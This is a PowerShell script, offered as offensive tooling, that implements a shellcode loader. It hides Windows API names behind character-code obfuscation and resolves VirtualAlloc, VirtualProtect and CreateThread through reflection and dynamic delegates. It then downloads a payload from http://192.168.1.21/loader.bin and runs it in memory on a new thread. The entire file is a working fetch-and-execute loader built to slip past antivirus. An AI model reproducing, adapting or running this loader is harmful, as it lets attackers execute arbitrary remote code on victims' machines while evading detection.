<#
    The most basic shellcode loader implementation in powershell, reflection and custom delegates used. Simple string obfuscation trough char codes. Used mainly for running PE generated shellcode trough donut.
#>
function ResolveAddr {
    Param([string]$lib_name, [string]$func_name)

    $sys_name = [char]83 + [char]121 + [char]115 + [char]116 + [char]101 + [char]109 + [char]46 + [char]100 + [char]108 + [char]108
    $type_name = [char]77 + [char]105 + [char]99 + [char]114 + [char]111 + [char]115 + [char]111 + [char]102 + [char]116 + `
    [char]46 + [char]87 + [char]105 + [char]110 + [char]51 + [char]50 + [char]46 + `
    [char]85 + [char]110 + [char]115 + [char]97 + [char]102 + [char]101 + [char]78 + [char]97 + [char]116 + `
    [char]105 + [char]118 + [char]101 + [char]77 + [char]101 + [char]116 + [char]104 + [char]111 + [char]100 + [char]115
    $mod_name = [char]71 + [char]101 + [char]116 + [char]77 + [char]111 + [char]100 + [char]117 + [char]108 + [char]101 + `
    [char]72 + [char]97 + [char]110 + [char]100 + [char]108 + [char]101
    $f_name = [char]71 + [char]101 + [char]116 + [char]80 + [char]114 + [char]111 + [char]99 + [char]65 + [char]100 + `
    [char]100 + [char]114 + [char]101 + [char]115 + [char]115

    $sys = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals($sys_name)})
    $unsf = $sys.GetType($type_name)
    $GMH = $unsf.GetMethod($mod_name)
    $tmp_arr = @()
    $unsf.GetMethods() | ForEach-Object { If ($_.Name -eq $f_name) { $tmp_arr += $_}}
    $GPA = $tmp_arr[0]
    $libh = $GMH.Invoke($null, @($lib_name))
    $faddr = $GPA.Invoke($null, @($libh, $func_name))
    return $faddr
}


function PrepareAPI {
    Param(
      [IntPtr]$faddr,
      [Type]$ret_type,
      [Type[]]$arg_types
    )

    $asm = New-Object System.Reflection.AssemblyName('MyRefl')
    $domain = [AppDomain]::CurrentDomain
    $asm_build = $domain.DefineDynamicAssembly($asm, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $mod_build = $asm_build.DefineDynamicModule('MyMod', $false)
    $type_build = $mod_build.DefineType('MyDeleg', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $const_build = $type_build.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $arg_types)
    $const_build.SetImplementationFlags('Runtime, Managed')
    $method_build = $type_build.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ret_type, $arg_types)
    $method_build.SetImplementationFlags('Runtime, Managed')
    $dlg_type = $type_build.CreateType()
    $myFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($faddr, $dlg_type)
    return $myFunc
}


$lib = ([char]107 + [char]101 + [char]114 + [char]110 + [char]101 + [char]108 + [char]51 + [char]50 + [char]46 + [char]100 + [char]108 + [char]108) -join ""
$va_name = ([char]86 + [char]105 + [char]114 + [char]116 + [char]117 + [char]97 + [char]108 + [char]65 + [char]108 + [char]108 + [char]111 + [char]99) -join ""
$vp_name = ([char]86 + [char]105 + [char]114 + [char]116 + [char]117 + [char]97 + [char]108 + [char]80 + [char]114 + [char]111 + [char]116 + [char]101 + [char]99 + [char]116) -join ""
$ct_name = ([char]67 + [char]114 + [char]101 + [char]97 + [char]116 + [char]101 + [char]84 + [char]104 + [char]114 + [char]101 + [char]97 + [char]100) -join ""
$wfso_name = ([char]87 + [char]97 + [char]105 + [char]116 + [char]70 + [char]111 + [char]114 + [char]83 + [char]105 + [char]110 + [char]103 + [char]108 + [char]101 + [char]79 + [char]98 + [char]106 + [char]101 + [char]99 + [char]116) -join ""


$f1 = PrepareAPI (ResolveAddr $lib $va_name) ([IntPtr]) @([IntPtr], [UInt32], [UInt32], [UInt32])
$f2 = PrepareAPI (ResolveAddr $lib $vp_name) ([Bool]) @([IntPtr], [UInt32], [UInt32], [Uint32].MakeByRefType())
$f3 = PrepareAPI (ResolveAddr $lib $ct_name) ([IntPtr]) @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr])
$f4 = PrepareAPI (ResolveAddr $lib $wfso_name) ([Int]) @([IntPtr], [Int32])


$mem_rw = 0x04
$mem_rx = 0x20
$mem_rcm = 0x3000

## or download it directly
$url = "http://192.168.1.21/loader.bin"
[Byte[]] $buf = (New-Object System.Net.WebClient).DownloadData($url)

$addr = $f1.Invoke([IntPtr]::Zero, $buf.length, $mem_rcm, $mem_rw)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $buf.length)

$old_protect = 0
$res = $f2.Invoke($addr, $buf.length, $mem_rx, [ref]$old_protect)
$thand = $f3.Invoke([IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
$f4.Invoke($thand, 0xFFFFFFFF)
